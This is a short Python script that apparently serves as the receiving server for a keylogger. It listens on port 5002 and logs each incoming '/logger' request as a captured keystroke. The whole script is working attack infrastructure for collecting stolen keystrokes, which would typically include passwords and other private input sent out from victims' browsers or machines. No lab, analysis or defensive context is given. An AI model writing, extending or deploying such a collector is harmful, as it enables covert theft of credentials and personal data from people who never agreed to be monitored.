from http.server import BaseHTTPRequestHandler, HTTPServer

class KeyLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/logger"):
            print(f"[+] Keystroke captured: {self.path}")
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 5002), KeyLoggerHandler)
    print("[*] Listening on http://0.0.0.0:5002")
    server.serve_forever()
